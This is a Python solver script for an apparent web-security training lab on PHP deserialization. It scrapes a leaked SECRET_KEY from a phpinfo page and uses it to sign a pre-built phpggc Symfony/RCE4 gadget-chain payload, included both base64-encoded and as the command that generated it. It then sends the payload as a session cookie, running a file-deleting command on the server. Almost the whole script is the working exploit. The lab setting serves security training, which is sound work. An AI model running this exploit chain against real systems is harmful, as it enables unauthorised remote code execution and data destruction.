#####################################################################
#
# Lab: Exploiting PHP deserialization with a pre-built gadget chain
#
# Hack Steps:
#      1. Fetch the phpinfo page
#      2. Extract the secret key
#      3. Sign the payload with the secret key
#      4. Fetch the home page with the modified object as session
#         to delete the morale.txt file
#
#####################################################################
import requests
import re
from colorama import Fore
import hashlib
import hmac

# Change this to your lab URL
LAB_URL = "https://0af6004b0394ea348004fd8e00750039.web-security-academy.net"

def main():
    print(Fore.WHITE + "â¦—1â¦˜ Fetching the phpinfo page.. ", end="", flush=True)

    phpinfo_page = fetch("/cgi-bin/phpinfo.php")        

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "â¦—2â¦˜ Extracting the secret key.. ", end="", flush=True)

    secret_key = re.findall("SECRET_KEY </td><td class=\"v\">(\w*) </td>", phpinfo_page.text)[0]

    print(Fore.GREEN + "OK" + Fore.WHITE + " => " + Fore.YELLOW + secret_key)
    print(Fore.WHITE + "â¦—3â¦˜ Signing the payload with the secret key.. ", end="", flush=True)        

    #
    #    this payload was generated using the following commands:
    #    ~$ git clone https://github.com/ambionics/phpggc.git
    #    ~$ cd phpggc
    #    ~$ ./phpggc Symfony/RCE4 exec 'rm /home/carlos/morale.txt' | base64 -w0
    payload = "Tzo0NzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxUYWdBd2FyZUFkYXB0ZXIiOjI6e3M6NTc6IgBTeW1mb255XENvbXBvbmVudFxDYWNoZVxBZGFwdGVyXFRhZ0F3YXJlQWRhcHRlcgBkZWZlcnJlZCI7YToxOntpOjA7TzozMzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQ2FjaGVJdGVtIjoyOntzOjExOiIAKgBwb29sSGFzaCI7aToxO3M6MTI6IgAqAGlubmVySXRlbSI7czoyNjoicm0gL2hvbWUvY2FybG9zL21vcmFsZS50eHQiO319czo1MzoiAFN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcVGFnQXdhcmVBZGFwdGVyAHBvb2wiO086NDQ6IlN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcUHJveHlBZGFwdGVyIjoyOntzOjU0OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAcG9vbEhhc2giO2k6MTtzOjU4OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAc2V0SW5uZXJJdGVtIjtzOjQ6ImV4ZWMiO319Cg=="
    sig_hmac_sh1 = hmac.new(secret_key.encode(), payload.encode(), hashlib.sha1).hexdigest()
    serialized_object = f"""{{"token":"{payload}","sig_hmac_sha1":"{sig_hmac_sh1}"}}"""

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "â¦—4â¦˜ Fetching the home page with the modified object as session to delete the morale.txt file.. ", end="", flush=True)        

    cookies = { "session": serialized_object }
    fetch("/", cookies)

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "ðŸ—¹ The lab should be marked now as " + Fore.GREEN + "solved")



def fetch(path, cooikies = None):
    try:  
        return requests.get(f"{LAB_URL}{path}",cookies=cooikies, allow_redirects=False)
    except:
        print(Fore.RED + "â¦—!â¦˜ Failed to fetch " + path + " through exception")
        exit(1)

        
if __name__ == "__main__":
    main()

